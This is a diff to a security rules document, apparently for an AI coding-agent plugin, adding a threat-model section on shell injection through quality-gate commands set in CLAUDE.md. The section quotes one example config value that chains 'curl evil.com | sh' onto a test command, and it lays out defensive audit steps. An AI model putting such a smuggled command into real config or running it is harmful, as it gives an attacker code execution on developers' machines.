@@ -1,3 +1,7 @@
+---
+tier: always
+---
+
 # Security Rules (Always-on)
 
 Core security principles that apply to ALL code. Web-specific rules (CSP, rate limiting, CSRF) are in `security-web.md`. Compliance and AI/LLM rules live in the baseline `security-compliance` rules (not vendored into this plugin).
@@ -69,6 +73,31 @@ Once a service crosses ~10 managed secrets, `.env.example` alone stops being a u
 - Audit all new dependencies before adding: check npm download trends, last publish date, maintainer count. Minimum 1000 weekly downloads unless justified.
 - In CI: always use `pnpm install --frozen-lockfile` to prevent lockfile tampering.
 - Registry hijacking is mitigated by pnpm's scoped registry config in `.npmrc` (`@your-org:registry=...` + `strict-ssl=true`). pnpm v9 lockfiles do not embed registry URLs — they resolve from `.npmrc` at install time.
+
+### Session Config Command Trust (Quality-Gate Command Injection)
+
+The quality-gate loop resolves gate commands via three-level precedence (explicit override → Session Config → built-in defaults) and executes them with `spawnSync(cmd, { shell: true })`. A malicious commit to `CLAUDE.md` could inject shell metacharacters (e.g., `test-command: npm test; curl evil.com | sh`), making this RCE-equivalent within the repo's trust model.
+
+**Why this is acceptable by design:**
+
+- **VCS anchors trust:** All file changes, including `CLAUDE.md` edits, are commit-gated. Malicious Session Config changes require a commit to land in `HEAD` — the change is visible in `git log` and subject to human code review before merge.
+- **No privilege escalation:** The fixer-agent dispatch happens within the same session's effective permissions. A developer with permission to commit to the repo already has permission to execute arbitrary code via any other file (e.g., `package.json` scripts, `.husky/` hooks, test files). Session Config `*-command` is **not** a new attack surface — it is equivalent to the existing commit-review trust model.
+- **Bounded scope:** Commands are only read and executed during inter-wave Quality-Gate runs with `verification-auto-fix.enabled: true` (default `false`). A repo without that flag enabled never parses Session Config commands at all.
+
+**The four command-bearing surfaces (sanctioned):**
+
+1. `test-command` — Quality-Gate test runner.
+2. `typecheck-command` — Quality-Gate typecheck runner.
+3. `lint-command` — Quality-Gate lint runner.
+4. `custom-phases[].command` (#637) — repo-declared deterministic close/housekeeping phases run at session-end Phase 2.5 via Bash with exit-code gating. Same VCS-trust-anchor model as the trio above: any change is commit-gated and visible in `git log`. As defense-in-depth, `scripts/lib/config/custom-phases.mjs` additionally rejects shell metacharacters in `command`/`review`/`name` and drops the offending record with a WARN.
+
+**Operator audit checklist:**
+
+1. **Review Session Config drift** as part of standard code review. Any PR that modifies a command-bearing key MUST show the before/after — unexpected values are an audit opportunity.
+2. **Watch for unexpected Session Config keys.** If a PR introduces a new command-bearing entry outside the documented set (`lint-command`, `typecheck-command`, `test-command`, and `custom-phases[].command`), investigate — these are the surfaces `scripts/parse-config.mjs` parses into executable commands.
+3. **Treat Session Config like code.** A malicious Session Config change is equivalent to a malicious code change. Rely on your existing VCS review process; do not add extra gates for Session Config specifically.
+
+Cross-references: `scripts/lib/qg-command-drift-banner.mjs` (session-start banner for `*-command` drift) · `scripts/lib/quality-gate.mjs` (`runQualityGateWithRetry`) · `.claude/rules/quality-gates-autofix.md` (auto-fix loop behaviour).
 
 ### SEC-020-1: Package Legitimacy Audit (Slopcheck — #520)
 
